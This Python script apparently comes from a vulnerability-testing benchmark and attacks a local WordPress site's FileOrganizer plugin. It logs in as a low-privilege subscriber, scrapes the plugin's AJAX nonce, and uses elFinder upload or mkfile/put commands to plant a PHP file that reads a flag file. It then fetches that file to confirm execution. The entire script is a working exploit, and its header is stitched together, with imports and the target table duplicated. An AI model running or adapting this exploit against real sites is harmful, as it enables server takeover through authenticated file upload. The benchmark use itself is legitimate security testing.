#!/usr/bin/env python3
"""Method-side executable probe: run a candidate dict against the target.
Usage: python3 seed_exec.py <candidate.json> [version]
"""
import sys, json, urllib.request, urllib.parse, time, subprocess
BASE = {
    "v0": "http://127.0.0.1:39440",
    "v1": "http://127.0.0.1:39441",
}
import argparse
import json
import os
import re
import subprocess
import sys
import time
from pathlib import Path
import requests
PAYLOAD = "<?php echo @file_get_contents('/flag/pcb_flag.txt'); ?>"
AJAX = "/wp-admin/admin-ajax.php?action=fileorganizer_file_folder_manager"
USER, PW = "subscriber", "subpass"
BASE = {
    "v0": "http://127.0.0.1:39440",
    "v1": "http://127.0.0.1:39441",
}
def run_probe(candidate, *, version="v1"):
    
    base = BASE[version]
    op = candidate["op"] if isinstance(candidate, dict) else str(candidate)
    fname = candidate.get("filename", "pcb.php") if isinstance(candidate, dict) else "pcb.php"
    result = {"version": version, "op": op, "filename": fname}
    try:
        s = _login(base)
        nonce = _nonce(s, base)
        cwd = _open_root(s, base, nonce)
        if op == "upload":
            result["elfinder"] = _op_upload(s, base, nonce, cwd, fname)
        elif op == "mkfile_put":
            result["elfinder"] = _op_mkfile_put(s, base, nonce, cwd, fname)
        else:
            result["error"] = f"unknown op {op}"
            return result
        fr = requests.get(f"{base}/{fname}", timeout=15)
        result["fetch_status"] = fr.status_code
        result["fetched_body"] = fr.text[:200]
    except Exception as e:  
        result["error"] = f"{type(e).__name__}: {e}"
    return result
def _nonce(s: requests.Session, base: str) -> str:
    r = s.get(f"{base}/wp-admin/admin.php?page=fileorganizer", timeout=15)
    m = re.search(r"fileorganizer_ajax_nonce\s*=\s*\"([a-f0-9]+)\"", r.text)
    if not m:
        raise RuntimeError(f"nonce not found (status {r.status_code})")
    return m.group(1)
def _open_root(s, base, nonce):
    j = _elf(s, base, nonce, cmd="open", target="", init="1")
    return j["cwd"]["hash"]
def _op_mkfile_put(s, base, nonce, cwd, fname):
    mk = _elf(s, base, nonce, cmd="mkfile", target=cwd, name=fname)
    if not mk.get("added"):
        return {"mkfile": mk}
    h = mk["added"][0]["hash"]
    put = _elf(s, base, nonce, cmd="put", target=h, content=PAYLOAD)
    return {"mkfile": mk, "put": put}
def _op_upload(s, base, nonce, cwd, fname):
    r = s.post(f"{base}{AJAX}",
               data={"cmd": "upload", "target": cwd, "fileorganizer_nonce": nonce},
               files={"upload[]": (fname, PAYLOAD, "application/octet-stream")},
               timeout=25)
    try:
        return r.json()
    except Exception:
        return {"_raw": r.text[:400]}
def _login(base: str) -> requests.Session:
    s = requests.Session()
    s.get(f"{base}/wp-login.php", timeout=15)
    s.cookies.set("wordpress_test_cookie", "WP Cookie check")
    s.post(
        f"{base}/wp-login.php",
        data={"log": USER, "pwd": PW, "wp-submit": "Log In",
              "redirect_to": f"{base}/wp-admin/", "testcookie": "1"},
        timeout=15, allow_redirects=True,
    )
    if not any(c.name.startswith("wordpress_logged_in") for c in s.cookies):
        raise RuntimeError("subscriber login failed")
    return s
def _elf(s, base, nonce, **params):
    params["fileorganizer_nonce"] = nonce
    r = s.post(f"{base}{AJAX}", data=params, timeout=25)
    try:
        return r.json()
    except Exception:
        return {"_raw": r.text[:400], "_status": r.status_code}


import os as _os_pcb
_pbt = _os_pcb.environ.get("PCB_TARGET_BASE")
if _pbt:
    for _d in ("BASE", "HOSTPORT", "PORTS"):
        if _d in globals() and isinstance(globals()[_d], dict):
            for _v in list(globals()[_d]):
                globals()[_d][_v] = _pbt
_pt = _os_pcb.environ.get("PCB_TARGET_PORT")
if _pt:
    if "BASE" in globals() and isinstance(globals()["BASE"], dict):
        for _v in list(globals()["BASE"]):
            _val = globals()["BASE"][_v]
            if isinstance(_val, (tuple, list)):
                globals()["BASE"][_v] = (str(_val[0]), int(_pt))
            elif isinstance(_val, int) or (isinstance(_val, str) and _val.isdigit()):
                globals()["BASE"][_v] = int(_pt)
            else:
                globals()["BASE"][_v] = f"http://127.0.0.1:{int(_pt)}"
    for _d in ("HOSTPORT", "PORTS"):
        if _d in globals() and isinstance(globals()[_d], dict):
            for _v in list(globals()[_d]):
                _old = globals()[_d][_v]
                if isinstance(_old, (tuple, list)):
                    globals()[_d][_v] = (str(_old[0]), int(_pt))
                else:
                    globals()[_d][_v] = int(_pt)

if __name__ == "__main__":
    cand = json.load(open(sys.argv[1]))
    version = sys.argv[2] if len(sys.argv) > 2 else "v1"
    r = run_probe(cand, version=version)
    print(json.dumps(r, default=str))